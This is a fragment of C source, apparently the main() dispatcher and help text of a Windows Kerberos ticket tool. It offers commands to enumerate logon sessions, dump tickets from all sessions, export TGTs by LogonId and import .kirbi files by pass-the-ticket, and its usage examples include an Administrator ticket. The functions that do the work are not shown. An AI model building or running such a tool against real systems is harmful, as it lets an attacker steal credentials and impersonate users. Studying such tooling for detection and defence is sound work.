    if (argc > 1 && _stricmp(argv[1], "sessions") == 0) {
        PrintCurrentLogonId();
        EnumerateLogonSessions();
    }
    else if (argc > 1 && _stricmp(argv[1], "klist") == 0) {
        PrintCurrentLogonId();
        EnumerateMyTickets();
    }
    else if (argc > 1 && _stricmp(argv[1], "tickets") == 0) {
        PrintCurrentLogonId();
        EnumerateAllTickets();
    }
    else if (argc > 1 && _stricmp(argv[1], "auto") == 0) {
        AutoExportAndImport();
    }
    else if (argc > 2 && _stricmp(argv[1], "export") == 0) {
        ExportTicket(argv[2]);
    }
    else if (argc > 2 && _stricmp(argv[1], "ptt") == 0) {
        PassTheTicket(argv[2]);
    }
    else {
        PrintBanner();
        printf("Kerberos Sessions and Tickets Enumerator\n\n");
        printf("Usage:\n");
        printf("  %s sessions         - Enumerate logon sessions (like 'klist sessions')\n", argv[0]);
        printf("  %s klist            - Enumerate MY tickets (current session)\n", argv[0]);
        printf("  %s tickets          - Enumerate ALL tickets from ALL sessions\n", argv[0]);
        printf("  %s export <LogonId> - Export TGT by LogonId (hex format)\n", argv[0]);
        printf("  %s ptt <file>       - Import .kirbi ticket\n\n", argv[0]);
        printf("  %s auto             - Interactive: list TGTs and import selected one\n", argv[0]);

        printf("Examples:\n");
        printf("  %s sessions\n", argv[0]);
        printf("  %s klist\n", argv[0]);
        printf("  %s tickets          # View tickets from ALL sessions with Base64\n", argv[0]);
        printf("  %s export 0x79fb3   # Export TGT for LogonId 0x79fb3\n", argv[0]);
        printf("  %s ptt 0x79fb3_Administrator.kirbi\n", argv[0]);
        printf("  %s auto             # Interactive mode to import a TGT\n", argv[0]);
    }

    return 0;
}